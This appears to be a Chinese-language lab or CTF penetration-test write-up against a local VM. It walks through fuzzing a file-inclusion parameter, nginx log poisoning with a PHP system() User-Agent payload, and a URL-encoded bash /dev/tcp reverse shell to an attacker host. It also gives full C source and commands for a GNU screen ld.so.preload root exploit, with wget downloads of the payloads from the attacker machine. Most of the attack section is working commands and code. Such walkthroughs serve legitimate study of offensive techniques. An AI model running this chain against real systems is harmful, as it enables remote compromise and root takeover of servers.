## 信息收集
**主机发现**
- ![](file-20260903184531212.png)
**端口发现**
- ![](file-20260903184531214.png)
综合发现
- ![](file-20260903184531216.png)
**指纹识别**
- ![](file-20260903184531218.png)
**目录发现**
- ![](file-20260903184531220.png)
### 重中之重
**文件包含**：访问发现 一个现象，每次刷新下面的footer部分会变，说明其中是用了include等类似方式加载读取文件
- ![](file-20260903184531221.png)![](file-20260903184531223.png)![](file-20260903184531224.png)
**之前目录发现了footer.php访问看看**
- ![](file-20260903184531226.png)
**这里应该有一个参数用来包含文件，使用fuzz获得参数file**
- 
	![](file-20260903184531229.png)
**一开始卡了很久**：因为响应都一样
	==参数值错了服务器可能就默认加载文件导致所有文件的响应都是一样的，无法区别正确响应==
**突破**：
	==参数对了但是包含的文件不存在则会出现差异，包含正确文件与错误文件的区别甄别可能性大一些服务端这方面的处理可能不是很完善==
技巧：遍历参数，参数值设置为不存在的，这里出现差异
- 
	![](file-20260903184531230.png)
	![](file-20260903184531232.png)
**文件包含**
	![](file-20260903184531234.png)
**既然可以包含/etc/pass，那是否也可以包含日志文件**
直接上网查找nginx的默认路径，尝试访问，如果失败再去尝试fuzz，这里直接访问成功
```
/var/log/nginx/access.log
/var/log/nginx/error.log
```
- ![](file-20260903184531236.png)
**日志注入并访问，发现成功执行了命令**
```
curl -A "<?php system(\$_GET['cmd']); ?>" "http://192.168.230.161/index.php"

curl "http://192.168.230.161/thankyou.php?file=/var/log/nginx/access.log&cmd=id"
```
- 
	![](file-20260903184531239.png)
## 漏洞利用
**获取反弹shell**
```bash
前面注入日志时，写入的模板已经是 <?php system($_GET['cmd']); ?>。因此传给 cmd 的内容只需要写纯 Shell 命令（如 id 或 whoami），不需要再套一层 system(...)。
    
特殊字符未 URL 编码：Shell 命令中的空格、&、> 等符号直接写在 URL 中会被 Nginx/PHP 解析异常或截断（比如 & 会被当成 GET 参数分隔符）。

bash -c 'bash -i >& /dev/tcp/192.168.230.141/8888 0>&1'

bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.230.141%2F8888%200%3E%261%27

curl "http://192.168.230.161/thankyou.php?file=/var/log/nginx/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.230.141%2F8888%200%3E%261%27"
```
- 
	![](file-20260903184531241.png)
反弹shell成功
	![](file-20260903184531242.png)
**升级shell**
	![](file-20260903184531253.png)
**寻找提权路径**
	![](file-20260903184531263.png)
## 权限提升
- 
	![](file-20260903184531264.png)
编译 `libhax.so`

```bash
cat << 'EOF' > libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

gcc -fPIC -shared -ldl -o libhax.so libhax.c
```
编译 `rootshell`
```bash
cat << 'EOF' > rootshell.c
#include <stdio.h>
#include <unistd.h>

int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    char *args[] = {"/bin/sh", NULL};
    execvp("/bin/sh", args);
}
EOF

gcc -o rootshell rootshell.c
```
目标机器上拉取编译好的程序
```
cd /tmp
wget http://192.168.230.141/libhax.so -O libhax.so
wget http://192.168.230.141/rootshell -O rootshell
chmod +x rootshell
```
- ![](file-20260903184531268.png)
**提权**：
```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```
- ![](file-20260903184531270.png)
但是没有成功貌似是kali编译的太新了版本可能有问题！